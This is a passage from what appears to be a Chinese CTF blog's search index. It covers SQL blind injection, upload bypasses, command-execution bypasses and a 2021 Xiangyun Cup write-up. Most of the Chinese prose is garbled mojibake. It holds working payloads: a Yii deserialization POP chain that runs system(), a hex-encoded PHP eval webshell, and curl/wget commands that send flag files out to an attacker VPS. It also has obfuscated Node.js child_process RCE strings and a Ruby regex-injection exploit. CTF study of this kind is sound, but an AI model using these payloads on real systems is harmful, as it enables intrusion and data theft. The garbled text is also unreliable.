ä½†æ˜¯ï¼Œç»å¤§å¤šæ•°æƒ…å†µä¸‹ï¼ŒæŸéœ€æ±‚æŸä¸€æ¡ SQL è¯­å¥å¯èƒ½ä¼šè¢«åå¤è°ƒç”¨æ‰§è¡Œï¼Œæˆ–è€…æ¯æ¬¡æ‰§è¡Œçš„æ—¶å€™åªæœ‰ä¸ªåˆ«çš„å€¼ä¸åŒï¼ˆæ¯”å¦‚ select çš„ where å­å¥å€¼ä¸åŒï¼Œupdate çš„ set å­å¥å€¼ä¸åŒï¼Œinsert çš„ values å€¼ä¸åŒï¼‰ã€‚å¦‚æœæ¯æ¬¡éƒ½éœ€è¦ç»è¿‡ä¸Šé¢çš„è¯æ³•è¯­ä¹‰è§£æã€è¯­å¥ä¼˜åŒ–ã€åˆ¶å®šæ‰§è¡Œè®¡åˆ’ç­‰ï¼Œåˆ™æ•ˆç‡å°±æ˜æ˜¾ä¸è¡Œäº†ã€‚ æ‰€è°“é¢„ç¼–è¯‘è¯­å¥å°±æ˜¯å°†æ­¤ç±» SQL è¯­å¥ä¸­çš„å€¼ç”¨å ä½ç¬¦æ›¿ä»£ï¼Œå¯ä»¥è§†ä¸ºå°† SQL è¯­å¥æ¨¡æ¿åŒ–æˆ–è€…è¯´å‚æ•°åŒ–ï¼Œä¸€èˆ¬ç§°è¿™ç±»è¯­å¥å«Prepared Statementsã€‚ é¢„ç¼–è¯‘è¯­å¥çš„ä¼˜åŠ¿åœ¨äºå½’çº³ä¸ºï¼šä¸€æ¬¡ç¼–è¯‘ã€å¤šæ¬¡è¿è¡Œï¼Œçœå»äº†è§£æä¼˜åŒ–ç­‰è¿‡ç¨‹ï¼›æ­¤å¤–é¢„ç¼–è¯‘è¯­å¥èƒ½é˜²æ­¢ SQL æ³¨å…¥ å®ä¾‹å¦‚ä¸‹ï¼Œå¯ä»¥é¢„ç¼–è¯‘ä¸€ä¸ªè¯­å¥ç„¶åæ‰§è¡Œå³å¯ï¼Œé‡Œé¢çš„å˜é‡æ˜¯å¯ä»¥æ›´æ¢çš„ set @a=xxxx;prepare stmt1 from @a;execute stmt1; ä¾‹1ï¼š ä»¥ä¸Š ä¸è®¾ç½®å˜é‡ç›´æ¥ä½¿ç”¨ï¼Œä»¥ä¸‹ä¸ºè®¾ç½®äº†å˜é‡ç›´æ¥è¿›è¡Œè°ƒç”¨ï¼Œ è¿™æ˜¯å¦ä¸€ç§ä½¿ç”¨æ–¹å¼ï¼Œä½†æ˜¯ä¼¼ä¹æ— æ³•ä½¿ç”¨å­—ç¬¦ä¸² DELIMITER $$create procedure fuck(out oo text(999), in ii text(999))BEGINset oo = ii;END$$call fuck(@a, 0x73656C656374202731323327)$$prepare b from @a$$execute b$$ æ— åˆ—åç›²æ³¨è¿‡æ»¤äº†in/orè¿‡æ»¤äº†in/orå¯¼è‡´æ— æ³•ä½¿ç”¨information_schema æ›¿ä»£åº“select table_name from sys.schema_auto_increment_columns where tabe_schema=database(); select table_name from mysql.innodb_table_stats where database_name='security' select group_concat(table_name) from sys.schema_table_statistics ä½†æ˜¯æˆ‘ä»¬æŸ¥è¯¢ä¸äº†åˆ—åï¼Œè¿™ä¸ªæ—¶å€™å°±éœ€è¦ä½¿ç”¨æ— åˆ—åç›²æ³¨ #æŸ¥è¯¢æ‰€æœ‰çš„åº“SELECT table_schemaFROM sys.schema_table_statisticsGROUP BY table_schema;SELECT table_schemaFROM sys.x$schema_flattened_keysGROUP BY table_schema;#æŸ¥è¯¢æŒ‡å®šåº“çš„è¡¨ï¼ˆè‹¥æ— åˆ™è¯´æ˜æ­¤è¡¨ä»æœªè¢«è®¿é—®ï¼‰SELECT table_nameFROM sys.schema_table_statisticsWHERE table_schema='mspwd' GROUP BY table_name;SELECT table_nameFROM sys.x$schema_flattened_keysWHERE table_schema='mspwd' GROUP BY table_name;#ç»Ÿè®¡æ‰€æœ‰è®¿é—®è¿‡çš„è¡¨æ¬¡æ•°:åº“å,è¡¨å,è®¿é—®æ¬¡æ•°select table_schema,table_name,sum(io_read_requests+io_write_requests) iofrom sys.schema_table_statisticsgroup by table_schema,table_nameorder by iodesc;#æŸ¥çœ‹æ‰€æœ‰æ­£åœ¨è¿æ¥çš„ç”¨æˆ·è¯¦ç»†ä¿¡æ¯SELECT user,db,command,current_statement,last_statement,timeFROM sys.session;#æŸ¥çœ‹æ‰€æœ‰æ›¾è¿æ¥æ•°æ®åº“çš„IP,æ€»è¿æ¥æ¬¡æ•°SELECT host,total_connectionsFROM sys.host_summary; æ— åˆ—åç›²æ³¨unioné‡å‘½åselect 1,2,3 union select * from users **æ³¨å…¥è¯­å¥å¯å†™ä¸º** select group_concat(a.2) from (select 1,2,3 union select * from users); æ¯”è¾ƒæ³•è¿™å°±æ˜¯ç›²æ³¨çš„æ€æƒ³äº†ï¼Œå‰é¢çš„éƒ¨åˆ†æ˜¯ä½ è¦æ³¨çš„å†…å®¹ï¼Œå› ä¸ºè¦åˆ¤æ–­ä¸åŒï¼Œæ‰€ä»¥åé¢çš„éƒ½åº”è¯¥æ˜¯æœ€å¤§çš„zzz è¿™æ ·æ‰èƒ½ä¿è¯æ¯ä¸€ä½çš„æ”¹å˜èƒ½å½±å“åé¢çš„ è¿™æ˜¯å¯¹æ¯”ç¬¬äºŒä½æ˜¯çš„å®Œæ•´ç»“æœæ˜¯admin ç¼–å†™è„šæœ¬çš„æ—¶å€™å¯èƒ½è¿˜éœ€è¦åšä¸€ä¸ªè¯¥å­—æ®µæ˜¯å¦ç»“æŸçš„åˆ¤æ–­ï¼Œä¹Ÿå°±æ˜¯ä»ä¸€å¼€å§‹éå†åˆ°æœ€åéƒ½æ²¡æ”¹å˜ è¯´æ˜ç»“æŸäº†","link":"/2021/08/09/%E5%A0%86%E5%8F%A0-%E6%97%A0%E5%88%97%E5%90%8D-%E6%97%B6%E9%97%B4%E7%9B%B2%E6%B3%A8/"},{"title":"æ–‡ä»¶æ“ä½œ","text":"æ–‡ä»¶ä¸Šä¼ ç»•è¿‡å‰æ®µéªŒè¯ç»•è¿‡æ”¹jsæ–‡ä»¶ MIME-TYPEç»•è¿‡æŠ“åŒ…æ”¹ é»‘åå•åç¼€ç»•è¿‡é€‰æ‹©php3ã€php4ã€phtmlç­‰ä¸å¸¸è§åç¼€ åŒå†™ç»•è¿‡æ–‡ä»¶å†…å®¹ç»•è¿‡","link":"/2021/08/18/%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C/"},{"title":"æ­£åˆ™åŒ¹é…æ—¶é—´ç›²æ³¨","text":"æ­£åˆ™åŒ¹é…æ—¶é—´ç›²æ³¨è®ºæ–‡ï¼šhttps://diary.shift-js.info/blind-regular-expression-injection/2021ciscn æ­£åˆ™è¡¨è¾¾å¼ç›²æ³¨exp require 'net/http'CHALLENGE = 'http://127.0.0.1:4567/'String.class_eval do def hex res = '' self.each_byte do |i| res += &quot;%02x&quot; % i end return res endenddef random(len) chars = (&quot;a&quot;..&quot;z&quot;).to_a + (&quot;A&quot;..&quot;Z&quot;).to_a + (&quot;0&quot;..&quot;9&quot;).to_a s = &quot;&quot; 1.upto(len) do s &lt;&lt; chars[rand(chars.size - 1)] end senddef check_result(reg, suffix) full_regexp = &quot;^(?=&quot; + reg + &quot;)((.*)*)*&quot; + suffix p full_regexp uri = URI(CHALLENGE + 'check/' + full_regexp.hex) Net::HTTP.get_response(uri)enddef leak(flag, r) chars = '0123456789abcdef' (0..15).each do |i| if check_result(flag + chars[i], r).body[&quot;False&quot;] p flag + chars[i] return leak(flag + chars[i], r) end endendr = random(10)+'$'leak('', r)# &quot;facdf9972bb5fdf9c35d6e09770e9af7&quot;","link":"/2021/08/26/%E6%AD%A3%E5%88%99%E5%8C%B9%E9%85%8D%E6%97%B6%E9%97%B4%E7%9B%B2%E6%B3%A8/"},{"title":"å‘½ä»¤æ‰§è¡Œå’Œç»•è¿‡","text":"é«˜å±å‡½æ•°:system()ã€exec()ã€shell_exec()ã€passthru()ã€pctnl_exec()ã€popen()ã€proc_open() æ³¨ï¼šåå¼•å·æ˜¯shell_exec()çš„åˆ«å ä»£ç æ³¨å…¥ç¨‹åºè¿‡æ»¤ä¸ä¸¥è°¨ï¼Œå¯¼è‡´ç”¨æˆ·å¯ä»¥å°†ä»£ç æ³¨å…¥å¹¶æ‰§è¡Œã€‚é«˜å±å‡½æ•°:eval()ã€assert()ã€preg_replace()ã€call_user_func()ç­‰ç­‰å’Œå‘½ä»¤æ‰§è¡Œçš„åŒºåˆ«æ˜¯ï¼šä¸€ä¸ªæ‰§è¡Œç³»ç»Ÿå‘½ä»¤ï¼Œä¸€ä¸ªæ‰§è¡ŒPHPä»£ç  bypassè¿‡æ»¤ç©ºæ ¼$IFS${IFS}$IFS$9&lt;&lt;&gt;{cat,flag.php}// ç”¨é€—å·å®ç°äº†ç©ºæ ¼åŠŸèƒ½ï¼Œéœ€è¦ç”¨{}æ‹¬èµ·æ¥%20%09 è¿‡æ»¤æŸå…³é”®å­—ca\\t y1n\\g.phpåæ–œçº¿ç»•è¿‡cat y1â€ng.php ä¸¤ä¸ªå•å¼•å·ç»•è¿‡echo â€œY2F0IC9mbGFnâ€ | base64 -d | bash#base64 ç¼–ç ç»•è¿‡echo â€œ6361742079316E672E706870â€ | xxd -r -p | bash#hex ç¼–ç ç»•è¿‡cat y1 [n] g.phpç”¨[]åŒ¹é…cat y1n*ç”¨*åŒ¹é…ä»»æ„cat y1n?cat y1{a..z}g more tlif3less tlif3head tlif3tail tlif3nl f*m4 * escapeshellcmd+escapeshellargç»•è¿‡æ— å‚æ•°rceshell_execç­‰æ— å›æ˜¾å‡½æ•° åˆ¤æ–­æ–¹æ³•ls;sleep(3) å¤åˆ¶æ³•copy flag.php flag.txtmv flag.php flag.txtcat flag.php &gt; flag.txt å‹ç¼©æ³•tar cvf flag.tar flag.php #tarå‹ç¼©tar zcvf flag.tar.gz flag.php #tarè§£å‹zip flag.zip flag.php #zipå‹ç¼©unzip flag.zip #zipè§£å‹ å†™shellæ³•echo 3c3f706870206576616c28245f504f53545b3132335d293b203f3e|xxd -r -ps &gt; webshell.php//echo &quot;&lt;?php @eval(\\$_POST[123]); ?&gt;&quot; &gt; webshell.php åˆ©ç”¨vpsåå¼¹shellæ³•ä¸€åœ¨è‡ªå·±çš„å…¬ç½‘æœåŠ¡å™¨ç«™ç‚¹æ ¹ç›®å½•å†™å…¥phpæ–‡ä»¶ï¼Œå†…å®¹å¦‚ä¸‹ï¼š&lt;!-- record.php --&gt;&lt;?php$data =$_GET['data'];$f = fopen(&quot;flag.txt&quot;, &quot;w&quot;);fwrite($f,$data);fclose($f);?&gt; åœ¨ç›®æ ‡æœåŠ¡å™¨çš„æµ‹è¯•ç‚¹å¯ä»¥å‘é€ä¸‹é¢å…¶ä¸­ä»»æ„ä¸€æ¡è¯·æ±‚è¿›è¡Œæµ‹è¯• curl http://*.*.*.**/record.php?data=`cat flag.php|base64`wget http://*.*.*.*/record.php?data=`cat flag.php|base64` æ³•äºŒ1.åœ¨å…¬ç½‘æœåŠ¡å™¨ç›‘å¬ç›‘å¬ç«¯å£ nc -lp 9999ï¼ˆç«¯å£å·ï¼‰ 2.å‘ç›®æ ‡æœåŠ¡å™¨å‘èµ·httpè¯·æ±‚ï¼Œæ‰§è¡Œcurlå‘½ä»¤ curl ip:9999 å‚è€ƒhttps://bbs.huaweicloud.com/blogs/detail/286904 æ³•ä¸‰ï¼Œå¤–å¸¦flagcurl -d @/home/www-data/res.txt http://xx:xxxcurl http://xx:xx/?d=`php -r 'file_'|base64`echo `ps`&gt;/home/www-data/res.txt ç¬¬ä¸€æ¡æ˜¯è¯»å–æ–‡ä»¶å†…å®¹ï¼Œç¬¬äºŒæ¡æ˜¯æ‰§è¡Œå‘½ä»¤ï¼Œå¯ä»¥å°†æ‰§è¡Œå‘½ä»¤çš„ç»“æœä¿å­˜ä¸ºä¸€ä¸ªæ–‡ä»¶ï¼Œç„¶åå†å»è¿›è¡Œè¯»å– nodejs RCE1.child_processchild_processæ˜¯ç”¨æ¥æ‰§è¡Œç³»ç»Ÿå‘½ä»¤æ¨¡å— require(&quot;child_process&quot;).exec(&quot;sleep 3&quot;);require(&quot;child_process&quot;).execSync(&quot;sleep 3&quot;);require(&quot;child_process&quot;).execFile(&quot;/bin/sleep&quot;,[&quot;3&quot;]); //è°ƒç”¨æŸä¸ªå¯æ‰§è¡Œæ–‡ä»¶ï¼Œåœ¨ç¬¬äºŒä¸ªå‚æ•°ä¼ argsrequire(&quot;child_process&quot;).spawn('sleep', ['3']);require(&quot;child_process&quot;).spawnSync('sleep', ['3']);require(&quot;child_process&quot;).execFileSync('sleep', ['3']); 2.nodejsä¸­çš„å‘½ä»¤æ‰§è¡Œè¿‡æ»¤å…³é”®å­—16è¿›åˆ¶ç¼–ç ç»•è¿‡require(&quot;child_process&quot;)[&quot;exe\\x63Sync&quot;](&quot;curl 127.0.0.1:1234&quot;) unicodeç¼–ç require(&quot;child_process&quot;)[&quot;exe\\u0063Sync&quot;](&quot;curl 127.0.0.1:1234&quot;) åŠ å·æ‹¼æ¥require('child_process')['exe'%2b'cSync']('curl 127.0.0.1:1234') æ¨¡æ¿å­—ç¬¦ä¸²require('child_process')[`${`${`exe`}cSync`}`]('curl 127.0.0.1:1234') concatè¿æ¥require(&quot;child_process&quot;)[&quot;exe&quot;.concat(&quot;cSync&quot;)](&quot;curl 127.0.0.1:1234&quot;) base64ç¼–ç eval(Buffer.from('Z2xvYmFsLnByb2Nlc3MubWFpbk1vZHVsZS5jb25zdHJ1Y3Rvci5fbG9hZCgiY2hpbGRfcHJvY2VzcyIpLmV4ZWNTeW5jKCJjdXJsIDEyNy4wLjAuMToxMjM0Iik=','base64').toString()) Obejct.keyså®é™…ä¸Šé€šè¿‡requireå¯¼å…¥çš„æ¨¡å—æ˜¯ä¸€ä¸ªObjectï¼Œæ‰€ä»¥å°±å¯ä»¥ç”¨Objectä¸­çš„æ–¹æ³•æ¥æ“ä½œè·å–å†…å®¹ã€‚åˆ©ç”¨Object.valueså°±å¯ä»¥æ‹¿åˆ°child_processä¸­çš„å„ä¸ªå‡½æ•°æ–¹æ³•ï¼Œå†é€šè¿‡æ•°ç»„ä¸‹æ ‡å°±å¯ä»¥æ‹¿åˆ°execSync console.log(require('child_process').constructor===Object)//trueObject.values(require('child_process'))[5]('curl 127.0.0.1:1234') Reflectåœ¨jsä¸­ï¼Œéœ€è¦ä½¿ç”¨Reflectè¿™ä¸ªå…³é”®å­—æ¥å®ç°åå°„è°ƒç”¨å‡½æ•°çš„æ–¹å¼ã€‚è­¬å¦‚è¦å¾—åˆ°evalå‡½æ•°ï¼Œå¯ä»¥é¦–å…ˆé€šè¿‡Reflect.ownKeys(global)æ‹¿åˆ°æ‰€æœ‰å‡½æ•°ï¼Œç„¶åglobal[Reflect.ownKeys(global).find(x=&gt;x.includes('eval'))]å³å¯å¾—åˆ°eval console.log(Reflect.ownKeys(global))//è¿”å›æ‰€æœ‰å‡½æ•°console.log(global[Reflect.ownKeys(global).find(x=&gt;x.includes('eval'))])//æ‹¿åˆ°eval æ‹¿åˆ°evalä¹‹åï¼Œå°±å¯ä»¥å¸¸è§„æ€è·¯rceäº† global[Reflect.ownKeys(global).find(x=&gt;x.includes('eval'))]('global.process.mainModule.constructor._load(&quot;child_process&quot;).execSync(&quot;curl 127.0.0.1:1234&quot;)') è¿™é‡Œè™½ç„¶æœ‰å¯èƒ½è¢«æ£€æµ‹åˆ°çš„å…³é”®å­—ï¼Œä½†ç”±äºmainModuleã€globalã€child_processç­‰å…³é”®å­—éƒ½åœ¨å­—ç¬¦ä¸²é‡Œï¼Œå¯ä»¥åˆ©ç”¨ä¸Šé¢æåˆ°çš„æ–¹æ³•ç¼–ç ï¼Œè­¬å¦‚16è¿›åˆ¶ã€‚ global[Reflect.ownKeys(global).find(x=&gt;x.includes('eval'))]('\\x67\\x6c\\x6f\\x62\\x61\\x6c\\x5b\\x52\\x65\\x66\\x6c\\x65\\x63\\x74\\x2e\\x6f\\x77\\x6e\\x4b\\x65\\x79\\x73\\x28\\x67\\x6c\\x6f\\x62\\x61\\x6c\\x29\\x2e\\x66\\x69\\x6e\\x64\\x28\\x78\\x3d\\x3e\\x78\\x2e\\x69\\x6e\\x63\\x6c\\x75\\x64\\x65\\x73\\x28\\x27\\x65\\x76\\x61\\x6c\\x27\\x29\\x29\\x5d\\x28\\x27\\x67\\x6c\\x6f\\x62\\x61\\x6c\\x2e\\x70\\x72\\x6f\\x63\\x65\\x73\\x73\\x2e\\x6d\\x61\\x69\\x6e\\x4d\\x6f\\x64\\x75\\x6c\\x65\\x2e\\x63\\x6f\\x6e\\x73\\x74\\x72\\x75\\x63\\x74\\x6f\\x72\\x2e\\x5f\\x6c\\x6f\\x61\\x64\\x28\\x22\\x63\\x68\\x69\\x6c\\x64\\x5f\\x70\\x72\\x6f\\x63\\x65\\x73\\x73\\x22\\x29\\x2e\\x65\\x78\\x65\\x63\\x53\\x79\\x6e\\x63\\x28\\x22\\x63\\x75\\x72\\x6c\\x20\\x31\\x32\\x37\\x2e\\x30\\x2e\\x30\\x2e\\x31\\x3a\\x31\\x32\\x33\\x34\\x22\\x29\\x27\\x29') è¿™é‡Œè¿˜æœ‰ä¸ªå°trickï¼Œå¦‚æœè¿‡æ»¤äº†evalå…³é”®å­—ï¼Œå¯ä»¥ç”¨includes('eva')æ¥æœç´¢evalå‡½æ•°ï¼Œä¹Ÿå¯ä»¥ç”¨startswith('eva')æ¥æœç´¢ è¿‡æ»¤ä¸­æ‹¬å·çš„æƒ…å†µåœ¨3.2ä¸­ï¼Œè·å–åˆ°evalçš„æ–¹å¼æ˜¯é€šè¿‡globalæ•°ç»„ï¼Œå…¶ä¸­ç”¨åˆ°äº†ä¸­æ‹¬å·[]ï¼Œå‡å¦‚ä¸­æ‹¬å·è¢«è¿‡æ»¤ï¼Œå¯ä»¥ç”¨Reflect.getæ¥ç»• Reflect.get(target, propertyKey[, receiver])çš„ä½œç”¨æ˜¯è·å–å¯¹è±¡èº«ä¸ŠæŸä¸ªå±æ€§çš„å€¼ï¼Œç±»ä¼¼äºtarget[name]ã€‚ æ‰€ä»¥å–evalå‡½æ•°çš„æ–¹å¼å¯ä»¥å˜æˆ Reflect.get(global, Reflect.ownKeys(global).find(x=&gt;x.includes('eva'))) åé¢æ‹¼æ¥ä¸Šå‘½ä»¤æ‰§è¡Œçš„payloadå³å¯ã€‚ https://www.anquanke.com/post/id/237032 bashç›²æ³¨","link":"/2021/08/26/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E5%92%8C%E7%BB%95%E8%BF%87/"},{"title":"2021ç¥¥äº‘æ¯webé¢˜è§£","text":"å‰è¨€å°±åšäº†ä¿©é¢˜ï¼Œå¦å¤–ä¸€é¢˜è¿˜æ˜¯èµ›ååŠå°æ—¶åæ‰åšå‡ºæ¥ï¼Œå¤ªå¤ªå¤ªå¤ªå¤ªå¤ªå¤ªå¤ªå¤ªå¤ªå¤ªèœäº† ezyiiç½‘ä¸Šæœ‰ç°æˆçš„é“¾å­ æ‹¿åˆ°ç›´æ¥æ‰“å°±è¡Œäº†ï¼Œåé¢åœ¨ç ”ç©¶ä¸€ä¸‹è¿‡ç¨‹å§ &lt;?phpnamespace Codeception\\Extension{ use Faker\\DefaultGenerator; use GuzzleHttp\\Psr7\\AppendStream; class RunProcess{ protected $output; private $processes = []; public function __construct(){ $this-&gt;processes[]=new DefaultGenerator(new AppendStream()); $this-&gt;output=new DefaultGenerator('jiang'); } } echo urlencode(serialize(new RunProcess()));}namespace Faker{ class DefaultGenerator{ protected $default; public function __construct($default = null) { $this-&gt;default = $default;}}}namespace GuzzleHttp\\Psr7{ use Faker\\DefaultGenerator; final class AppendStream{ private $streams = []; private $seekable = true; public function __construct(){ $this-&gt;streams[]=new CachingStream(); } } final class CachingStream{ private $remoteStream; public function __construct(){ $this-&gt;remoteStream=new DefaultGenerator(false); $this-&gt;stream=new PumpStream(); } } final class PumpStream{ private $source; private $size=-10; private $buffer; public function __construct(){ $this-&gt;buffer=new DefaultGenerator('j'); include(&quot;closure/autoload.php&quot;); $a = function(){system('cat /flag.txt');phpinfo(); }; $a = \\Opis\\Closure\\serialize($a); $b = unserialize($a); $this-&gt;source=$b; } }} å®‰å…¨æ£€æµ‹è¿™é¢˜çš„å°±åœ¨äºæ‰«æ‰«æ‰«æ‰«æã€‚ã€‚ã€‚ã€‚ã€‚ã€‚ä¹Ÿå°±æ˜¯ä¿¡æ¯æ”¶é›† é¦–å…ˆæ˜¯ .login.php.swp æœ‰æºç ï¼Œç„¶åusernameå¯æ§ &lt;?php//error_reporting(0);ob_start();session_start();function check3($username){ $pattern = &quot;\\/\\*|\\*|\\.\\.\\/|\\.\\/|&lt;|&gt;|\\?|\\*|load_file|outfile|dumpfile|sub|hex|where&quot;; $pattern .= &quot;|file_put_content|file_get_content|fwrite|curl|system|eval|assert&quot;; $pattern .= &quot;|select|insert|update|delete|load_file|into outfile|drop&quot;; $pattern .=&quot;|passthru|exec|system|chroot|scandir|chgrp|chown|shell_exec|proc_open|proc_get_status|popen|ini_alter|ini_restore&quot;; $pattern .=&quot;|`|openlog|syslog|readlink|symlink|popepassthru|stream_socket_server|assert|pcntl_exec|http|.php|.ph|\\@|:\\/\\/|flag&quot;; $pattern .=&quot;|file|dict|gopher&quot;; $vpattern = explode(&quot;|&quot;,$pattern); foreach($vpattern as $value){ if (preg_match( &quot;/$value/i&quot;, $username )){ echo &quot;Ã¦Â£â‚¬Ã¦Âµâ€¹Ã¥Ë†Â°Ã¦ÂÂ¶Ã¦â€ÂÃ¥Â­â€”Ã§Â¬Â¦&quot;; exit(0); } }}$username=file_get_content(&quot;php://input&quot;);check3($username);$username=json_decode($username)-&gt;username; if($username){ $_SESSION['user1']=$username; Header(&quot;Location:./index.php&quot;); ob_end_flush(); exit(0);}?&gt; å¯ä»¥å‘ç°session_start()å‡½æ•°ï¼Œusernameåˆå­˜å…¥sessionä¸­ï¼Œå¤§æ¦‚ç‡å°±æ˜¯sessionæ–‡ä»¶åŒ…å«äº†ï¼Œäºæ˜¯å†æ‰¾æ‰¾å“ªé‡Œèƒ½ç»§ç»­åŒ…å«å†…å®¹åœ¨åé¢è¾“å…¥urlçª—å£é‚£é‡Œï¼Œå‘ç°è¾“å…¥è¿™ä¸ªï¼Œå¯ä»¥è¯»åˆ°include123.php 127.0.0.1/admin/include123.php ç„¶åè¿™é‡Œå°±æœ‰ä¸€ä¸ªincludeå‡½æ•°ï¼Œé‚£ä¹ˆå°±å¯ä»¥å®ç°sessionæ–‡ä»¶åŒ…å«äº† è§£æ³•ä¸€ï¼š åˆ©ç”¨usernameè¿›è¡Œsessionæ–‡ä»¶åŒ…å«ï¼Œç”±äºåé¢ä½¿ç”¨äº†json_decodeï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥ä½¿ç”¨unioncodeç¼–ç è¾“å…¥å†…å®¹ï¼Œè¿™æ ·å°±å°±å¯ä»¥ç»•è¿‡å‰é¢çš„è¿‡æ»¤äº†PS:ä¸€å¼€å§‹ä¸€ç›´æ²¡æˆåŠŸï¼Œåé¢æ‰çŸ¥é“æ˜¯å®ä½“åŒ–ç¼–ç çš„é—®é¢˜ï¼Œè¾“å…¥çš„å†…å®¹è™½ç„¶å¯ä»¥æ­£å¸¸æ˜¾ç¤º ä½†å·²ç»ä¸æ˜¯åŸæœ¬çš„ä¸œè¥¿äº†ï¼Œå…¶ä¸­å°±æ˜¯&lt;è¿™ä¸ªç¼–ç é”™è¯¯äº†ï¼Œè¿™ä¸ªæ˜¯å­¦é•¿ç»™çš„unioncodeç¼–ç è„šæœ¬ï¼Œç”¨è¿™ä¸ªå°±è¡Œäº† def UNICODE(payload): #unicode res_payload = &quot;&quot; for i in payload: i = &quot;\\\\u00{}&quot;.format(hex(ord(i))[2:]) res_payload += i print(&quot;[+]'{}' Convert to UNICDOE: \\&quot;{}\\&quot;&quot;.format(payload,res_payload)) ç›´æ¥ä¸Šç½‘ç«™åŠ å¯†å°±æ²¡æˆåŠŸäº†ã€‚ã€‚çœ‹ä¸‹é¢è¿™ä¸ª payload http://127.0.0.1/admin/include123.php?u=/tmp/sess_xxxx(ä½ çš„session) è§£æ³•äºŒï¼š å¯ä»¥çœ‹åˆ°æˆ‘ä»¬è¾“å…¥çš„é“¾æ¥æœ€ç»ˆä¹Ÿä¼šåœ¨sessionæ–‡ä»¶é‡Œé¢å‡ºç°ï¼Œæ‰€ä»¥æ­¤æ—¶æˆ‘ä»¬å¯ä»¥åˆ©ç”¨è¿™ä¸ªé“¾æ¥è¿›è¡Œæ–‡ä»¶åŒ…å« http://127.0.0.1/admin/include123.php?u=/tmp/sess_xxxx(ä½ çš„session)&amp;a=&lt;?system('ls');?&gt; ä½†æ˜¯éœ€è¦æ³¨æ„çš„æ˜¯ä¸èƒ½æœ‰ç©ºæ ¼ï¼Œä¼šè¢«ç›´æ¥æˆªæ–­ï¼ï¼Œæ‰€ä»¥åé¢å¯ä»¥ä½¿ç”¨è¿™ä¸ªè¿›è¡Œç»•è¿‡ cat${IFS}$/fl&quot;&quot;ag å°ç»“è¿˜æ˜¯å¤ªå¤ªå¤ªå¤ªå¤ªå¤ªå¤ªå¤ªå¤ªå¤ªå¤ªå¤ªå¤ªå¤ªå¤ªå¤ªå¤ªå¤ªå¤ªå¤ªå¤ªå¤ªå¤ªå¤ªå¤ªå¤ªå¤ªå¤ªå¤ªå¤ªå¤ªå¤ªå¤ªå¤ªå¤ªå¤ªå¤ªå¤ªå¤ªå¤ªå¤ªå¤ªå¤ªå¤ªå¤ªå¤ªå¤ªå¤ªå¤ªå¤ªå¤ªå¤ªå¤ªå¤ªå¤ªå¤ªå¤ªå¤ªå¤ªå¤ªå¤ªå¤ªå¤ªå¤ªå¤ªå¤ªå¤ªå¤ªå¤ªå¤ªå¤ªå¤ªå¤ªå¤ªå¤ªå¤ªå¤ªå¤ªå¤ªå¤ªå¤ªå¤ªå¤ªå¤ªå¤ªå¤ªå¤ªå¤ªå¤ªå¤ªå¤ªå¤ªå¤ªå¤ªå¤ªå¤ªå¤ªå¤ªå¤ªå¤ªå¤ªå¤ªå¤ªå¤ªå¤ªå¤ªå¤ªå¤ªå¤ªå¤ªå¤ªå¤ªå¤ªå¤ªå¤ªå¤ªå¤ªå¤ªå¤ªå¤ªå¤ªå¤ªå¤ªå¤ªå¤ªå¤ªå¤ªå¤ªå¤ªå¤ªå¤ªå¤ªå¤ªå¤ªå¤ªå¤ªå¤ªå¤ªå¤ªå¤ªå¤ªå¤ªå¤ªå¤ªå¤ªå¤ªå¤ªå¤ªå¤ªå¤ªå¤ªå¤ªå¤ªå¤ªå¤ªå¤ªå¤ªå¤ªå¤ªå¤ªå¤ªå¤ªå¤ªå¤ªå¤ªå¤ªå¤ªå¤ªå¤ªå¤ªå¤ªå¤ªå¤ªå¤ªå¤ªå¤ªå¤ªå¤ªå¤ªå¤ªå¤ªå¤ªå¤ªå¤ªå¤ªå¤ªå¤ªå¤ªå¤ªå¤ªå¤ªå¤ªå¤ªå¤ªå¤ªå¤ªå¤ªå¤ªå¤ªå¤ªå¤ªå¤ªå¤ªå¤ªå¤ªå¤ªå¤ªå¤ªå¤ªå¤ªå¤ªå¤ªå¤ªå¤ªå¤ªå¤ªå¤ªå¤ªå¤ªå¤ªå¤ªå¤ªå¤ªå¤ªå¤ªå¤ªå¤ªå¤ªå¤ªå¤ªå¤ªå¤ªå¤ªå¤ªå¤ªå¤ªå¤ªå¤ªå¤ªå¤ªå¤ªå¤ªå¤ªå¤ªå¤ªå¤ªå¤ªå¤ªå¤ªå¤ªå¤ªå¤ªå¤ªå¤ªå¤ªå¤ªå¤ªå¤ªå¤ªå¤ªå¤ªå¤ªå¤ªå¤ªå¤ªå¤ªå¤ªå¤ªå¤ªå¤ªå¤ªå¤ªå¤ªå¤ªå¤ªå¤ªå¤ªå¤ªå¤ªå¤ªå¤ªå¤ªå¤ªå¤ªå¤ªå¤ªå¤ªå¤ªå¤ªå¤ªå¤ªå¤ªå¤ªå¤ªå¤ªå¤ªå¤ªå¤ªå¤ªå¤ªå¤ªå¤ªå¤ªå¤ªå¤ªå¤ªå¤ªå¤ªå¤ªå¤ªå¤ªå¤ªå¤ªå¤ªå¤ªå¤ªå¤ªå¤ªå¤ªå¤ªå¤ªå¤ªå¤ªå¤ªå¤ªå¤ªå¤ªå¤ªå¤ªå¤ªå¤ªå¤ªå¤ªå¤ªå¤ªå¤ªå¤ªå¤ªå¤ªå¤ªå¤ªå¤ªå¤ªèœäº†ï¼Œè¦èµ°çš„è·¯è¿˜å¾ˆè¿œï¼Œå¥½å¥½åŠ æ²¹åæ€ä¸€ä¸‹è¿™æ¬¡è¿™ä¸ªå®‰å…¨ç›‘æµ‹åº”è¯¥å¯ä»¥å¾ˆå¿«åšå‡ºæ¥çš„ï¼Œä¸»è¦æ˜¯ä¿¡æ¯æ”¶é›†å¾—ä¸è¡Œï¼Œå¤ªæ…¢äº†ï¼Œè€Œä¸”æ¢äº†å¥½å‡ ä¸ªå·¥å…·æœ‰å¿…è¦æ›´æ–°ä¸€ä¸‹å­—å…¸ä¹‹ç±»çš„äº†ï¼","link":"/2021/08/30/2021%E7%A5%A5%E4%BA%91%E6%9D%AF%E9%A2%98%E8%A7%A3/"},{"title":"CTFä¸­å¥½ç”¨çš„ç½‘ç«™","text":"","link":"/2021/09/01/CTF%E4%B8%AD%E5%A5%BD%E7%94%A8%E7%9A%84%E7%BD%91%E7%AB%99/"},{"title":"ssrfæœåŠ¡ç«¯è¯·æ±‚ä¼ªé€ 